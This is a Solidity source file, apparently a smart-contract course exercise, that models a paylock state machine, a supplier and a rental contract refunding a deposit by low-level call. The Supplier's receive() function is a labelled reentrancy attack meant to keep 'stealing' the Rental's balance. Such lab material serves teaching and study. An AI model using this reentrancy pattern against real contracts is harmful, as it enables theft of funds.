pragma solidity >=0.4.16 <0.7.0;

contract Paylock {
    
    enum State { Working , Completed , Done_1 , Delay , Done_2 , Forfeit }
    
    int disc;
    State st;

    int clock;
    address timeAdd;
    int time_N;

    constructor() public {
        st = State.Working;
        disc = 0;
        clock = 0;
        timeAdd = msg.sender;
    }

    function signal() public {
        require( st == State.Working );
        st = State.Completed;
        disc = 10;
    }
    
    function tick() public {
        require( st != State.Working );
        // E2
        require(msg.sender == timeAdd);
        clock += 1;
    }

    function collect_1_Y() public {
        require( st == State.Completed );
        // E1
        require(clock < 4);
        st = State.Done_1;
        disc = 10;
    }

    function collect_1_N() external {
        require( st == State.Completed && clock >= 4);
        st = State.Delay;
        disc = 5;
        time_N = clock;
    }

    function collect_2_Y() external {
        require( st == State.Delay && clock < time_N + 4);
        // E1
        require(clock < 8);
        st = State.Done_2;
        disc = 5;
    }

    function collect_2_N() external {
        require( st == State.Delay && clock >= time_N + 4);
        st = State.Forfeit;
        disc = 0;
        time_N = clock;
    }

}

contract Supplier {
    
    Paylock p;
    
    enum State { Working , Completed }
    enum ResourceState { Untouched, Acquired, Released }

    State st;
    Rental r;
    ResourceState rSt;
    event Paid(uint256 bal);
    
    constructor(address pp, address payable rent) public payable {
        p = Paylock(pp);
        st = State.Working;
        r = Rental(rent);
        rSt = ResourceState.Untouched;
    }
    
    // E3
    function acquire_resource() external payable{
        require(rSt == ResourceState.Untouched);
        r.rent_out_resource.value(1 wei)();
        rSt = ResourceState.Acquired;
    }
    
    function return_resource() external payable{
        require(rSt == ResourceState.Acquired);
        r.retrieve_resource();
        rSt = ResourceState.Released;
    }
    
    function finish() external {
        require (st == State.Working && rSt == ResourceState.Released);
        p.signal();
        st = State.Completed;
    }
    

    // Display the balance
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
    
    receive() external payable {
        // Detect if there is enough gas to continue stealing
        if (address(r).balance > 0 wei && gasleft() > 20000) {
            try r.retrieve_resource() {                
            
            }
            catch {
                
            }
        }
    }
    
}

contract Rental {
    
    address resource_owner;
    bool resource_available;
    uint256 public deposit = 1 wei;
    
    constructor() public payable {
        resource_available = true;
    }
    
    // E4
    function rent_out_resource() external payable{
        require(resource_available == true);
        //CHECK FOR PAYMENT HERE
        require(msg.value == deposit);
        resource_owner = msg.sender;
        resource_available = false;
    }

    function retrieve_resource() external {
        require(resource_available == false && msg.sender == resource_owner);
        //RETURN DEPOSIT HERE
        resource_available = true;
        (bool sucess,) = resource_owner.call.value(deposit)("");
        require(sucess);
    }
    
    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }
    
    receive() external payable {
    }
    
}